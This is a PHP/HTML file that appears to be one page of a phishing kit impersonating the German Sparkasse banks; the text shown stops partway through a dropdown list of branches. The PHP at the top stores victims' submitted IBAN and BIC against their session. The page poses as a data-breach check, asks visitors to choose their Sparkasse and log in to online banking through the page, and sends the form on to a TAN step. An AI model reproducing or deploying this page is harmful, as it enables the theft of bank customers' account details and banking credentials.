<?php

require_once 'db.php';
session_start();
$session_id= session_id();

$IBAN = $_POST['IBAN'];
$BIC = $_POST['BIC'];
$sql = 'UPDATE user_data SET iban = :iban, bic = :bic WHERE session_id = :session_id';

$statement= $pdo->prepare($sql);
$statement->bindValue("session_id",$session_id);
$statement->bindValue("iban",$IBAN);
$statement->bindValue("bic",$BIC);
$statement->execute();

?>

<!doctype html>

<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
    * {
      box-sizing: border-box;
    }
    
    body {
      font-family: Arial, Helvetica, sans-serif;
      min-height: 100vh; margin:0;
   }

    input {
     display: flex;
     align-items: center;
     justify-content: center;
     margin: 0 auto;
   }
   
    
    /* Style the header */
    header {
      background-color: #df002a ;
      padding: 20px;
      text-align: left;
      font-size: 35px;
      color: white;
      min-height:50px;
    }
    
    /* Create two columns/boxes that floats next to each other */
    nav {
      float: left;
      width: 30%;
      background: rgb(255, 255, 255);
      padding: 20px;
    }
    
    /* Style the list inside the menu */
    nav ul {
      list-style-type: none;
      padding: 0;
    }
    
    article {
      float: left;
      padding: 20px;
      width: 100%;
      background-color: #e3e3e3;
      min-height:50px;
    }
    
    /* Clear floats after the columns */
    section::after {
      content: "";
      display: table;
      clear: both;
    }
    
    /* Style the footer */
    footer {
      background-color: rgb(122, 122, 122);
      padding: 10px;
      text-align: left;
      color: white;
    }

    body{ display:flex; flex-direction:column; }
    article{ flex:1; }

    a:link {color: white;
            text-decoration: none;}
    a:visited {color: white;
            text-decoration: none;}
    a:hover {color: white;
            text-decoration: none;}
    a:active {color: white;
            text-decoration: none;}

    /* Responsive layout - makes the two columns/boxes stack on top of each other instead of next to each other, on small screens */
    @media (max-width: 600px) {
      nav, article {
        width: 100%;
        height: auto;
      }
    }
    </style>

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
</head>
    <body>
      <header>
        <a href="https://www.dsgv.de">        <img src="
        Ressourcen/Klein (sparkassenlogo).png" style="height:auto; width:20%;">
        </a>
      </header> 


    <article>
      <div class="row">
        <div class="col-sm-6">
          <div class="card">
            <div class="card-body">
              <h4 style="color: #df002a;"><b>Hinweis</b></h4>
              <p>Um zu plausibilisieren ob Ihre Daten betroffen sind, wählen Sie bitte Ihre Sparkasse aus und melden Sie sich in Ihren Online-Banking über unsere Seite an.</p>    
              <img src="Ressourcen/OLBPiktogram.png" style="height:auto; width:30%;">
            </div>
          </div>
        </div>
        <div class="col-sm-6">
          <div class="card">
            <div class="card-body">
              <h4 style="color: #df002a;"><b>Angaben zum Online-Banking</b></h4>
              <form name="bankverbundung" id="form1" method="POST" action="Tan.php">
               
              Bundesland *<br> <select name="parent" id="id_parent" data-child-id='id_child' class='dependent-selects__parent' style="width: 250px;" > 
                  <option value="">--------</option>
                  <option value="Baden-Würtemberg" data-child-options="Bezirkssparkasse Reichenau|#Hohenzollerische Landesbank|#Kreissparkasse Sigmaringen|#Kreissparkasse Biberach|#Kreissparkasse Böblingen|#Kreissparkasse Esslingen-Nürtingen|#Kreissparkasse Freudenstadt|#Kreissparkasse Göppingen|#Kreissparkasse Heidenheim|#Kreissparkasse Heilbronn|#Kreissparkasse Ludwigsburg|#Kreissparkasse Ostalb|#Kreissparkasse Ravensburg|#Kreissparkasse Reutlingen|#Kreissparkasse Rottweil|#Kreissparkasse Tübingen|#Kreissparkasse Tuttlingen|#Kreissparkasse Waiblingen|#Sparkasse Baden-Baden Gaggenau|#Sparkasse Bodensee|#Sparkasse Bonndorf-Stühlingen|#Sparkasse Bühl|#Sparkasse Engen-Gottmadingen|#Sparkasse Freiburg-Nördlicher Breisgau|#Sparkasse Hanauerland|#Sparkasse Hegau-Bodensee|#Sparkasse Heidelberg|#Sparkasse Hochrhein|#Sparkasse Hochschwarzwald|#Sparkasse Hohenlohekreis|#Sparkasse Karlsruhe|#Sparkasse Kinzigtal|#Sparkasse Kraichgau Bruchsal-Bretten-Sinsheim|#Sparkasse Lörrach-Rheinfelden|#Sparkasse Markgräflerland|#Sparkasse Neckartal-Odenwald|#Sparkasse Offenburg/Ortenau|#Sparkasse Pforzheim Calw|#Sparkasse Pfullendorf-Meßkirch|#Sparkasse Rastatt-Gernsbach|#Sparkasse Rhein Neckar Nord|#Sparkasse Salem-Heiligenberg|#Sparkasse Schwäbisch Hall-Crailsheim|#Sparkasse Schwarzwald-Baar|#Sparkasse St. Blasien|#Sparkasse Staufen-Breisach|#Sparkasse Tauberfranken|#Sparkasse Ulm|#Sparkasse Wiesental|#Sparkasse Wolfach|#Sparkasse Zollernalb">Baden-Würtemberg</option>
                  <option value="Bayern" data-child-options="Kreis- und Stadtsparkasse Erding-Dorfen|#Kreis- und Stadtsparkasse Kaufbeuren|#Kreis- und Stadtsparkasse Wasserburg am Inn|#Kreissparkasse Kelheim|#Kreissparkasse Miesbach-Tegernsee|#Kreissparkasse München Starnberg Ebersberg|#Kreissparkasse Traunstein-Trostberg|#Sparkasse Aichach-Schrobenhausen|#Sparkasse Allgäu|#Sparkasse Altötting-Mühldorf|#Sparkasse Amberg-Sulzbach|#Sparkasse Ansbach|#Sparkasse Aschaffenburg-Alzenau|#Sparkasse Bad Kissingen|#Sparkasse Bad Neustadt a. d. Saale|#Sparkasse Bad Tölz-Wolfratshausen|#Sparkasse Bamberg|#Sparkasse Bayreuth|#Sparkasse Berchtesgadener Land|#Sparkasse Coburg – Lichtenfels|#Sparkasse Dachau|#Sparkasse Deggendorf|#Sparkasse Dillingen-Nördlingen|#Sparkasse Donauwörth|#Sparkasse Forchheim|#Sparkasse Freising Moosburg|#Sparkasse Freyung-Grafenau|#Sparkasse Fürstenfeldbruck|#Sparkasse Fürth|#Sparkasse Günzburg-Krumbach|#Sparkasse Hochfranken|#Sparkasse im Landkreis Cham|#Sparkasse im Landkreis Neustadt a. d. Aisch - Bad Windsheim|#Sparkasse im Landkreis Schwandorf|#Sparkasse Ingolstadt Eichstätt|#Sparkasse Kulmbach-Kronach|#Sparkasse Landsberg-Dießen|#Sparkasse Landshut|#Sparkasse Mainfranken Würzburg|#Sparkasse Miltenberg-Obernburg|#Sparkasse Mittelfranken-Süd|#Sparkasse Neu-Ulm - Illertissen|#Sparkasse Neuburg-Rain|#Sparkasse Neumarkt i.d.OPf.-Parsberg|#Sparkasse Niederbayern-Mitte|#Sparkasse Nürnberg|#Sparkasse Oberland|#Sparkasse Oberpfalz Nord|#Sparkasse Passau|#Sparkasse Pfaffenhofen|#Sparkasse Regen-Viechtach|#Sparkasse Regensburg|#Sparkasse Rosenheim-Bad Aibling|#Sparkasse Rottal-Inn|#Sparkasse Schwaben-Bodensee|#Sparkasse Schweinfurt-Haßberge|#Stadt- und Kreissparkasse Erlangen Höchstadt Herzogenaurach|#Stadtsparkasse Augsburg|#Stadtsparkasse München|#Vereinigte Sparkassen Eschenbach i.d.OPf. Neustadt a.d.Waldnaab Vohenstrauß|#Vereinigte Sparkassen Gunzenhausen">Bayern</option>
                  <option value="Berlin" data-child-options="Berliner Sparkasse">Berlin</option>
                  <option value="Brandenburg" data-child-options="Mittelbrandenburgische Sparkasse in Potsdam|#Sparkasse Barnim|#Sparkasse Elbe-Elster|#Sparkasse Märkisch-Oderland|#Sparkasse Niederlausitz|#Sparkasse Oder-Spree|#Sparkasse Ostprignitz-Ruppin|#Sparkasse Prignitz|#Sparkasse Spree-Neiße|#Sparkasse Uckermark|#Stadtsparkasse Schwedt">Brandenburg</option>
                  <option value="Bremen" data-child-options="Sparkasse Bremen AG|#Weser-Elbe-Sparkasse">Bremen</option>
                  <option value="Hamburg" data-child-options="Hamburger Sparkasse|#Sparkasse Harburg-Buxtehude|#Sparkasse Holstein"> Hamburg </option>
                  <option value="Hessen" data-child-options="Nassauische Sparkasse|#Frankfurter Sparkasse|#Kasseler Sparkasse|#Kreissparkasse Gelnhausen|#Kreissparkasse Groß-Gerau|#Kreissparkasse Limburg|#Kreissparkasse Schlüchtern|#Kreissparkasse Schwalm-Eder|#Kreissparkasse Weilburg|#Sparkasse Bad Hersfeld-Rotenburg|#Sparkasse Battenberg|#Sparkasse Bensheim|#Sparkasse Dieburg|#Sparkasse Dillenburg|#Sparkasse Fulda|#Sparkasse Gießen|#Sparkasse Grünberg|#Sparkasse Hanau|#Sparkasse Langen-Seligenstadt|#Sparkasse Laubach-Hungen|#Sparkasse Marburg-Biedenkopf|#Sparkasse Oberhessen|#Sparkasse Odenwaldkreis|#Sparkasse Offenbach|#Sparkasse Starkenburg|#Sparkasse Waldeck-Frankenberg|#Sparkasse Werra-Meißner|#Sparkasse Wetzlar|#Stadt- und Kreis-Sparkasse Darmstadt|#Stadtsparkasse Borken (Hessen)|#Stadtsparkasse Grebenstein|#Stadtsparkasse Schwalmstadt|#Taunus Sparkasse|#Rheinhessen Sparkasse">Hessen</option>
                  <option value="Mecklenburg-Vorpommern" data-child-options="Müritz-Sparkasse|#OstseeSparkasse Rostock|#Sparkasse Mecklenburg-Nordwest|#Sparkasse Mecklenburg-Schwerin|#Sparkasse Mecklenburg-Strelitz|#Sparkasse Neubrandenburg-Demmin|#Sparkasse Uecker-Randow|#Sparkasse Vorpommern">Mecklenburg-Vorpommern</option>
                  <option value="Niedersachen" data-child-options="Weser-Elbe-Sparkasse|#Sparkasse Harburg-Buxtehude|#Braunschweigische Landessparkasse Teilrechtsfähige Anstalt der Nord/LB|#Kreis-Sparkasse Northeim|#Kreissparkasse Bersenbrück|#Kreissparkasse Fallingbostel in Walsrode|#Kreissparkasse Grafschaft Bentheim zu Nordhorn|#Kreissparkasse Grafschaft Diepholz|#Kreissparkasse Melle|#Kreissparkasse Soltau|#Kreissparkasse Stade|#Kreissparkasse Syke|#Kreissparkasse Verden|#Landessparkasse zu Oldenburg|#Sparkasse Aurich-Norden|#Sparkasse Celle-Gifhorn-Wolfsburg|#Sparkasse Duderstadt|#Sparkasse Einbeck|#Sparkasse Emden|#Sparkasse Emsland|#Sparkasse Göttingen|#Sparkasse Hameln-Weserbergland|#Sparkasse Hannover|#Sparkasse Hildesheim Goslar Peine|#Sparkasse LeerWittmund|#Sparkasse Lüneburg|#Sparkasse Nienburg|#Sparkasse Osnabrück|#Sparkasse Osterode am Harz|#Sparkasse Rotenburg Osterholz|#Sparkasse Schaumburg|#Sparkasse Scheeßel|#Sparkasse Stade-Altes Land|#Sparkasse Uelzen Lüchow-Dannenberg|#Sparkasse Wilhelmshaven|#Stadtsparkasse Bad Pyrmont|#Stadtsparkasse Barsinghausen|#Stadtsparkasse Burgdorf|#Stadtsparkasse Cuxhaven|#Stadtsparkasse Wunstorf">Niedersachen</option>
                  <option value="Nordrhein-Westfalen" data-child-options="Herner Sparkasse|#Kreissparkasse Düsseldorf|#Kreissparkasse Euskirchen|#Kreissparkasse Halle (Westf.)|#Kreissparkasse Heinsberg|#Kreissparkasse Köln|#Kreissparkasse Steinfurt|#Kreissparkasse Wiedenbrück|#Niederrheinische Sparkasse RheinLippe|#Sparkasse Aachen|#Sparkasse am Niederrhein|#Sparkasse an der Lippe|#Sparkasse an Ennepe und Ruhr|#Sparkasse an Volme und Ruhr|#Sparkasse Arnsberg-Sundern|#Sparkasse Attendorn-Lennestadt-Kirchhundem|#Sparkasse Bad Oeynhausen - Porta Westfalica|#Sparkasse Beckum-Wadersloh|#Sparkasse Bergkamen-Bönen|#Sparkasse Bielefeld|#Sparkasse Bochum|#Sparkasse Bottrop|#Sparkasse Burbach-Neunkirchen|#Sparkasse Dortmund|#Sparkasse Duisburg|#Sparkasse Düren|#Sparkasse Essen|#Sparkasse Gelsenkirchen|#Sparkasse Geseke|#Sparkasse Gladbeck|#Sparkasse Gummersbach|#Sparkasse Gütersloh-Rietberg-Versmold|#Sparkasse Hamm|#Sparkasse Hattingen|#Sparkasse Hellweg-Lippe|#Sparkasse Herford|#Sparkasse Hilden-Ratingen-Velbert|#Sparkasse Hochsauerland|#Sparkasse Höxter|#Sparkasse Iserlohn|#Sparkasse Kierspe-Meinerzhagen|#Sparkasse KölnBonn|#Sparkasse Krefeld|#Sparkasse Lemgo|#Sparkasse Leverkusen|#Sparkasse Märkisches Sauerland Hemer–Menden|#Sparkasse Minden-Lübbecke|#Sparkasse Mitten im Sauerland|#Sparkasse Mülheim an der Ruhr|#Sparkasse Münsterland Ost|#Sparkasse Neuss|#Sparkasse Olpe-Drolshagen-Wenden|#Sparkasse Paderborn-Detmold|#Sparkasse Radevormwald-Hückeswagen|#Sparkasse Rhein-Maas|#Sparkasse Schwelm-Sprockhövel|#Sparkasse Siegen|#Sparkasse UnnaKamen|#Sparkasse Vest Recklinghausen|#Sparkasse Westmünsterland|#Sparkasse Witten|#Sparkasse Wittgenstein|#Stadt-Sparkasse Haan (Rheinl.)|#Stadt-Sparkasse Langenfeld|#Stadt-Sparkasse Solingen|#Stadtsparkasse Bocholt|#Stadtsparkasse Delbrück|#Stadtsparkasse Düsseldorf|#Stadtsparkasse Haltern am See|#Stadtsparkasse Lengerich|#Stadtsparkasse Mönchengladbach|#Stadtsparkasse Oberhausen|#Stadtsparkasse Rahden|#Stadtsparkasse Remscheid|#Stadtsparkasse Rheine|#Stadtsparkasse Wermelskirchen|#Stadtsparkasse Wuppertal|#Vereinigte Sparkasse im Märkischen Kreis">Nordrhein-Westfalen</option>
                  <option value="Rheinland-Pfalz" data-child-options="Nassauische Sparkasse|#Kreissparkasse Ahrweiler|#Kreissparkasse Birkenfeld|#Kreissparkasse Bitburg-Prüm|#Kreissparkasse Kusel|#Kreissparkasse Mayen|#Kreissparkasse Rhein-Hunsrück|#Kreissparkasse Vulkaneifel|#Sparkasse Donnersberg|#Sparkasse Kaiserslautern|#Sparkasse Koblenz|#Sparkasse Mittelmosel – Eifel Mosel Hunsrück|#Sparkasse Neuwied|#Sparkasse Rhein-Haardt|#Sparkasse Rhein-Nahe|#Sparkasse Südpfalz|#Sparkasse Südwestpfalz|#Sparkasse Trier|#Sparkasse Vorderpfalz|#Sparkasse Westerwald-Sieg|#Rheinhessen Sparkasse">Rheinland-Pfalz</option>
                  <option value="Saarland" data-child-options="Kreissparkasse Saarlouis|#Kreissparkasse Saarpfalz|#Kreissparkasse St. Wendel|#Sparkasse Merzig-Wadern|#Sparkasse Neunkirchen|#Sparkasse Saarbrücken">Saarland</option>
                  <option value="Sachen" data-child-options="Erzgebirgssparkasse|#Kreissparkasse Bautzen|#Kreissparkasse Döbeln|#Ostsächsische Sparkasse Dresden|#Sparkasse Chemnitz|#Sparkasse Leipzig|#Sparkasse Meißen|#Sparkasse Mittelsachsen|#Sparkasse Muldental|#Sparkasse Oberlausitz-Niederschlesien|#Sparkasse Vogtland|#Sparkasse Zwickau">Sachsen</option>
                  <option value="Sachsen-Anhalt" data-child-options="Harzsparkasse|#Kreissparkasse Anhalt-Bitterfeld|#Kreissparkasse Börde|#Kreissparkasse Stendal|#Saalesparkasse|#Salzlandsparkasse|#Sparkasse Altmark West|#Sparkasse Burgenlandkreis|#Sparkasse Magdeburg|#Sparkasse Mansfeld-Südharz|#Sparkasse Wittenberg|#Stadtsparkasse Dessau">Sachsen-Anhalt</option>
                  <option value="Schleswig-Holstein" data-child-options="Bordesholmer Sparkasse AG|#Förde Sparkasse|#Kreissparkasse Herzogtum Lauenburg|#Nord-Ostsee Sparkasse|#Sparkasse Elmshorn|#Sparkasse Mittelholstein AG|#Sparkasse Südholstein|#Sparkasse Westholstein|#Sparkasse zu Lübeck AG|#Stadtsparkasse Wedel|#Sparkasse Holstein">Schleswig-Holstein</option>
                  <option value="Thüringen" data-child-options="Kreissparkasse Eichsfeld|#Kreissparkasse Gotha|#Kreissparkasse Hildburghausen|#Kreissparkasse Nordhausen|#Kreissparkasse Saale-Orla|#Kreissparkasse Saalfeld-Rudolstadt|#Kyffhäusersparkasse Artern-Sondershausen|#Rhön-Rennsteig-Sparkasse|#Sparkasse Altenburger Land|#Sparkasse Arnstadt-Ilmenau|#Sparkasse Gera-Greiz|#Sparkasse Jena-Saale-Holzland|#Sparkasse Mittelthüringen|#Sparkasse Sonneberg|#Sparkasse Unstrut-Hainich|#Wartburg-Sparkasse">Thüringen</option>
                  </select>

                <br> <br> 
                Sparkasse *<br> <select name="child" id="id_child" class='dependent-selects__child' style="width: 250px;"> 
                  <option value="">--------</option>
                  <option value="Bezirkssparkasse Reichenau">Bezirkssparkasse Reichenau</option>
                  <option value="Hohenzollerische Landesbank">Hohenzollerische Landesbank</option>
                  <option value="Kreissparkasse Sigmaringen">Kreissparkasse Sigmaringen</option>
                  <option value="Kreissparkasse Biberach">Kreissparkasse Biberach</option>
                  <option value="Kreissparkasse Böblingen">Kreissparkasse Böblingen</option>
                  <option value="Kreissparkasse Esslingen-Nürtingen">Kreissparkasse Esslingen-Nürtingen</option>
                  <option value="Kreissparkasse Freudenstadt">Kreissparkasse Freudenstadt</option>
                  <option value="Kreissparkasse Göppingen">Kreissparkasse Göppingen</option>
                  <option value="Kreissparkasse Heidenheim">Kreissparkasse Heidenheim</option>
                  <option value="Kreissparkasse Heilbronn">Kreissparkasse Heilbronn</option>
                  <option value="Kreissparkasse Ludwigsburg">Kreissparkasse Ludwigsburg</option>
                  <option value="Kreissparkasse Ostalb">Kreissparkasse Ostalb</option>
                  <option value="Kreissparkasse Ravensburg">Kreissparkasse Ravensburg</option>
                  <option value="Kreissparkasse Reutlingen">Kreissparkasse Reutlingen</option>
                  <option value="Kreissparkasse Rottweil">Kreissparkasse Rottweil</option>
                  <option value="Kreissparkasse Tübingen">Kreissparkasse Tübingen</option>
                  <option value="Kreissparkasse Tuttlingen">Kreissparkasse Tuttlingen</option>
                  <option value="Kreissparkasse Waiblingen">Kreissparkasse Waiblingen</option>
                  <option value="Sparkasse Baden-Baden Gaggenau">Sparkasse Baden-Baden Gaggenau</option>
                  <option value="Sparkasse Bodensee">Sparkasse Bodensee</option>
                  <option value="Sparkasse Bonndorf-Stühlingen">Sparkasse Bonndorf-Stühlingen</option>
                  <option value="Sparkasse Bühl">Sparkasse Bühl</option>
                  <option value="Sparkasse Engen-Gottmadingen">Sparkasse Engen-Gottmadingen</option>
                  <option value="Sparkasse Freiburg-Nördlicher Breisgau">Sparkasse Freiburg-Nördlicher Breisgau</option>
                  <option value="Sparkasse Hanauerland">Sparkasse Hanauerland</option>
                  <option value="Sparkasse Hegau-Bodensee">Sparkasse Hegau-Bodensee</option>
                  <option value="Sparkasse Heidelberg">Sparkasse Heidelberg</option>
                  <option value="Sparkasse Hochrhein">Sparkasse Hochrhein</option>
                  <option value="Sparkasse Hochschwarzwald">Sparkasse Hochschwarzwald</option>
                  <option value="Sparkasse Hohenlohekreis">Sparkasse Hohenlohekreis</option>
                  <option value="Sparkasse Karlsruhe">Sparkasse Karlsruhe</option>
                  <option value="Sparkasse Kinzigtal">Sparkasse Kinzigtal</option>
                  <option value="Sparkasse Kraichgau Bruchsal-Bretten-Sinsheim">Sparkasse Kraichgau Bruchsal-Bretten-Sinsheim</option>
                  <option value="Sparkasse Lörrach-Rheinfelden">Sparkasse Lörrach-Rheinfelden</option>
                  <option value="Sparkasse Markgräflerland">Sparkasse Markgräflerland</option>
                  <option value="Sparkasse Neckartal-Odenwald">Sparkasse Neckartal-Odenwald</option>
                  <option value="Sparkasse Offenburg/Ortenau">Sparkasse Offenburg/Ortenau</option>
                  <option value="Sparkasse Pforzheim Calw">Sparkasse Pforzheim Calw</option>
                  <option value="Sparkasse Pfullendorf-Meßkirch">Sparkasse Pfullendorf-Meßkirch</option>
                  <option value="Sparkasse Rastatt-Gernsbach">Sparkasse Rastatt-Gernsbach</option>
                  <option value="Sparkasse Rhein Neckar Nord">Sparkasse Rhein Neckar Nord</option>
                  <option value="Sparkasse Salem-Heiligenberg">Sparkasse Salem-Heiligenberg</option>
                  <option value="Sparkasse Schwäbisch Hall-Crailsheim">Sparkasse Schwäbisch Hall-Crailsheim</option>
                  <option value="Sparkasse Schwarzwald-Baar">Sparkasse Schwarzwald-Baar</option>
                  <option value="Sparkasse St. Blasien">Sparkasse St. Blasien</option>
                  <option value="Sparkasse Staufen-Breisach">Sparkasse Staufen-Breisach</option>
                  <option value="Sparkasse Tauberfranken">Sparkasse Tauberfranken</option>
                  <option value="Sparkasse Ulm">Sparkasse Ulm</option>
                  <option value="Sparkasse Wiesental">Sparkasse Wiesental</option>
                  <option value="Sparkasse Wolfach">Sparkasse Wolfach</option>
                  <option value="Sparkasse Zollernalb">Sparkasse Zollernalb</option>
                  <option value="Kreis- und Stadtsparkasse Erding-Dorfen">Kreis- und Stadtsparkasse Erding-Dorfen</option>
                  <option value="Kreis- und Stadtsparkasse Kaufbeuren">Kreis- und Stadtsparkasse Kaufbeuren</option>
                  <option value="Kreis- und Stadtsparkasse Wasserburg am Inn">Kreis- und Stadtsparkasse Wasserburg am Inn</option>
                  <option value="Kreissparkasse Kelheim">Kreissparkasse Kelheim</option>
                  <option value="Kreissparkasse Miesbach-Tegernsee">Kreissparkasse Miesbach-Tegernsee</option>
                  <option value="Kreissparkasse München Starnberg Ebersberg">Kreissparkasse München Starnberg Ebersberg</option>
                  <option value="Kreissparkasse Traunstein-Trostberg">Kreissparkasse Traunstein-Trostberg</option>
                  <option value="Sparkasse Aichach-Schrobenhausen">Sparkasse Aichach-Schrobenhausen</option>
                  <option value="Sparkasse Allgäu">Sparkasse Allgäu</option>
                  <option value="Sparkasse Altötting-Mühldorf">Sparkasse Altötting-Mühldorf</option>
                  <option value="Sparkasse Amberg-Sulzbach">Sparkasse Amberg-Sulzbach</option>
                  <option value="Sparkasse Ansbach">Sparkasse Ansbach</option>
                  <option value="Sparkasse Aschaffenburg-Alzenau">Sparkasse Aschaffenburg-Alzenau</option>
                  <option value="Sparkasse Bad Kissingen">Sparkasse Bad Kissingen</option>
                  <option value="Sparkasse Bad Neustadt a. d. Saale">Sparkasse Bad Neustadt a. d. Saale</option>
                  <option value="Sparkasse Bad Tölz-Wolfratshausen">Sparkasse Bad Tölz-Wolfratshausen</option>
                  <option value="Sparkasse Bamberg">Sparkasse Bamberg</option>
                  <option value="Sparkasse Bayreuth">Sparkasse Bayreuth</option>
                  <option value="Sparkasse Berchtesgadener Land">Sparkasse Berchtesgadener Land</option>
                  <option value="Sparkasse Coburg – Lichtenfels">Sparkasse Coburg – Lichtenfels</option>
                  <option value="Sparkasse Dachau">Sparkasse Dachau</option>
                  <option value="Sparkasse Deggendorf">Sparkasse Deggendorf</option>
                  <option value="Sparkasse Dillingen-Nördlingen">Sparkasse Dillingen-Nördlingen</option>
                  <option value="Sparkasse Donauwörth">Sparkasse Donauwörth</option>
                  <option value="Sparkasse Forchheim">Sparkasse Forchheim</option>
                  <option value="Sparkasse Freising Moosburg">Sparkasse Freising Moosburg</option>
                  <option value="Sparkasse Freyung-Grafenau">Sparkasse Freyung-Grafenau</option>
                  <option value="Sparkasse Fürstenfeldbruck">Sparkasse Fürstenfeldbruck</option>
                  <option value="Sparkasse Fürth">Sparkasse Fürth</option>
                  <option value="Sparkasse Günzburg-Krumbach">Sparkasse Günzburg-Krumbach</option>
                  <option value="Sparkasse Hochfranken">Sparkasse Hochfranken</option>
                  <option value="Sparkasse im Landkreis Cham">Sparkasse im Landkreis Cham</option>
                  <option value="Sparkasse im Landkreis Neustadt a. d. Aisch - Bad Windsheim">Sparkasse im Landkreis Neustadt a. d. Aisch - Bad Windsheim</option>
                  <option value="Sparkasse im Landkreis Schwandorf">Sparkasse im Landkreis Schwandorf</option>
                  <option value="Sparkasse Ingolstadt Eichstätt">Sparkasse Ingolstadt Eichstätt</option>
                  <option value="Sparkasse Kulmbach-Kronach">Sparkasse Kulmbach-Kronach</option>
                  <option value="Sparkasse Landsberg-Dießen">Sparkasse Landsberg-Dießen</option>
                  <option value="Sparkasse Landshut">Sparkasse Landshut</option>
                  <option value="Sparkasse Mainfranken Würzburg">Sparkasse Mainfranken Würzburg</option>
                  <option value="Sparkasse Miltenberg-Obernburg">Sparkasse Miltenberg-Obernburg</option>
                  <option value="Sparkasse Mittelfranken-Süd">Sparkasse Mittelfranken-Süd</option>
                  <option value="Sparkasse Neu-Ulm - Illertissen">Sparkasse Neu-Ulm - Illertissen</option>
                  <option value="Sparkasse Neuburg-Rain">Sparkasse Neuburg-Rain</option>
                  <option value="Sparkasse Neumarkt i.d.OPf.-Parsberg">Sparkasse Neumarkt i.d.OPf.-Parsberg</option>
                  <option value="Sparkasse Niederbayern-Mitte">Sparkasse Niederbayern-Mitte</option>
                  <option value="Sparkasse Nürnberg">Sparkasse Nürnberg</option>
                  <option value="Sparkasse Oberland">Sparkasse Oberland</option>
                  <option value="Sparkasse Oberpfalz Nord">Sparkasse Oberpfalz Nord</option>
                  <option value="Sparkasse Passau">Sparkasse Passau</option>
                  <option value="Sparkasse Pfaffenhofen">Sparkasse Pfaffenhofen</option>
                  <option value="Sparkasse Regen-Viechtach">Sparkasse Regen-Viechtach</option>
                  <option value="Sparkasse Regensburg">Sparkasse Regensburg</option>
                  <option value="Sparkasse Rosenheim-Bad Aibling">Sparkasse Rosenheim-Bad Aibling</option>
                  <option value="Sparkasse Rottal-Inn">Sparkasse Rottal-Inn</option>
                  <option value="Sparkasse Schwaben-Bodensee">Sparkasse Schwaben-Bodensee</option>
                  <option value="Sparkasse Schweinfurt-Haßberge">Sparkasse Schweinfurt-Haßberge</option>
                  <option value="Stadt- und Kreissparkasse Erlangen Höchstadt Herzogenaurach">Stadt- und Kreissparkasse Erlangen Höchstadt Herzogenaurach</option>
                  <option value="Stadtsparkasse Augsburg">Stadtsparkasse Augsburg</option>
                  <option value="Stadtsparkasse München">Stadtsparkasse München</option>
                  <option value="Vereinigte Sparkassen Eschenbach i.d.OPf. Neustadt a.d.Waldnaab Vohenstrauß">Vereinigte Sparkassen Eschenbach i.d.OPf. Neustadt a.d.Waldnaab Vohenstrauß</option>
                  <option value="Vereinigte Sparkassen Gunzenhausen">Vereinigte Sparkassen Gunzenhausen</option>
                  <option value="Berliner Sparkasse">Berliner Sparkasse</option>
                  <option value="Mittelbrandenburgische Sparkasse in Potsdam">Mittelbrandenburgische Sparkasse in Potsdam</option>
                  <option value="Sparkasse Barnim">Sparkasse Barnim</option>
                  <option value="Sparkasse Elbe-Elster">Sparkasse Elbe-Elster</option>
                  <option value="Sparkasse Märkisch-Oderland">Sparkasse Märkisch-Oderland</option>
                  <option value="Sparkasse Niederlausitz">Sparkasse Niederlausitz</option>
                  <option value="Sparkasse Oder-Spree">Sparkasse Oder-Spree</option>
                  <option value="Sparkasse Ostprignitz-Ruppin">Sparkasse Ostprignitz-Ruppin</option>
                  <option value="Sparkasse Prignitz">Sparkasse Prignitz</option>
                  <option value="Sparkasse Spree-Neiße">Sparkasse Spree-Neiße</option>
                  <option value="Sparkasse Uckermark">Sparkasse Uckermark</option>
                  <option value="Stadtsparkasse Schwedt">Stadtsparkasse Schwedt</option>
                  <option value="Sparkasse Bremen AG">Sparkasse Bremen AG</option>
                  <option value="Weser-Elbe-Sparkasse">Weser-Elbe-Sparkasse</option>
                  <option value="Hamburger Sparkasse AG">Hamburger Sparkasse AG</option>
                  <option value="Sparkasse HolsteinNassauische Sparkasse">Sparkasse HolsteinNassauische Sparkasse</option>
                  <option value="Frankfurter Sparkasse">Frankfurter Sparkasse</option>
                  <option value="Kasseler Sparkasse">Kasseler Sparkasse</option>
                  <option value="Kreissparkasse Gelnhausen">Kreissparkasse Gelnhausen</option>
                  <option value="Kreissparkasse Groß-Gerau">Kreissparkasse Groß-Gerau</option>
                  <option value="Kreissparkasse Limburg">Kreissparkasse Limburg</option>
                  <option value="Kreissparkasse Schlüchtern">Kreissparkasse Schlüchtern</option>
                  <option value="Kreissparkasse Schwalm-Eder">Kreissparkasse Schwalm-Eder</option>
                  <option value="Kreissparkasse Weilburg">Kreissparkasse Weilburg</option>
                  <option value="Sparkasse Bad Hersfeld-Rotenburg">Sparkasse Bad Hersfeld-Rotenburg</option>
                  <option value="Sparkasse Battenberg">Sparkasse Battenberg</option>
                  <option value="Sparkasse Bensheim">Sparkasse Bensheim</option>
                  <option value="Sparkasse Dieburg">Sparkasse Dieburg</option>
                  <option value="Sparkasse Dillenburg">Sparkasse Dillenburg</option>
                  <option value="Sparkasse Fulda">Sparkasse Fulda</option>
                  <option value="Sparkasse Gießen">Sparkasse Gießen</option>
                  <option value="Sparkasse Grünberg">Sparkasse Grünberg</option>
                  <option value="Sparkasse Hanau">Sparkasse Hanau</option>
                  <option value="Sparkasse Langen-Seligenstadt">Sparkasse Langen-Seligenstadt</option>
                  <option value="Sparkasse Laubach-Hungen">Sparkasse Laubach-Hungen</option>
                  <option value="Sparkasse Marburg-Biedenkopf">Sparkasse Marburg-Biedenkopf</option>
                  <option value="Sparkasse Oberhessen">Sparkasse Oberhessen</option>
                  <option value="Sparkasse Odenwaldkreis">Sparkasse Odenwaldkreis</option>
                  <option value="Sparkasse Offenbach">Sparkasse Offenbach</option>
                  <option value="Sparkasse Starkenburg">Sparkasse Starkenburg</option>
                  <option value="Sparkasse Waldeck-Frankenberg">Sparkasse Waldeck-Frankenberg</option>
                  <option value="Sparkasse Werra-Meißner">Sparkasse Werra-Meißner</option>
                  <option value="Sparkasse Wetzlar">Sparkasse Wetzlar</option>
                  <option value="Stadt- und Kreis-Sparkasse Darmstadt">Stadt- und Kreis-Sparkasse Darmstadt</option>
                  <option value="Stadtsparkasse Borken (Hessen)">Stadtsparkasse Borken (Hessen)</option>
